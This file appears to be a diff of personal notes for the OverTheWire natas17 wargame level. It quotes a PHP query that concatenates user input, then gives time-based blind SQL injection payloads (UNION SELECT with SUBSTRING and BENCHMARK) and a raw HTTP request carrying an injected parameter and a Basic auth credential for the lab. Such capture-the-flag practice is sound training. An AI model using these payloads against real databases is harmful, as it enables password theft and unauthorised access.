@@ -1,0 +1,35 @@
+"SELECT * from users where username="natas17" OR username="badchars";
+
+
+"SELECT * from users where username=\""  .$_REQUEST["username"].   "\""; 
+
+".$_REQUEST["username"].
+
+SELECT * from users where username="natas18" UNION SELECT
+ IF(SUBSTRING(user_password,1,1) = CHAR(50), BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null)
+ FROM users WHERE user_id = 1
+
+
+
+
+
+SELECT * from users where username="";
+
+
+
+GET http://natas17.natas.labs.overthewire.org/index.php?username=natas18" or username=unhex(92);--&debug HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: http://natas17.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==
+Connection: keep-alive
+Referer: http://natas17.natas.labs.overthewire.org/index.php
+Upgrade-Insecure-Requests: 1
+Host: natas17.natas.labs.overthewire.org
+
+
+
+" UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1
